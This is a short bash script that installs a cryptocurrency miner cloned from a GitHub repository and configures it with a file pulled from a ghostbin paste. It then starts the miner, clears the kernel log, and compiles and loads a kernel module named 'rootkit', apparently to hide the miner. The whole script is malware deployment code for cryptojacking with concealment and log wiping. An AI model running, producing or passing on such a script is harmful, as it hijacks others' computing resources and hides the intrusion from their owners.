#!/bin/bash
sudo apt update
sudo apt-get -y install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev screen git make 
rm -rf /miner
mkdir /miner
cd /miner
git clone https://github.com/Mzikoa21/Zarrassa.git
cd Zarrassa
rm config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
sudo chmod 777 *
sudo chmod 777 /miner/binaries/*
sudo ./cpuminer.sh & 
cd rootkit
make
dmesg -C
insmod rootkit.ko
dmesg 
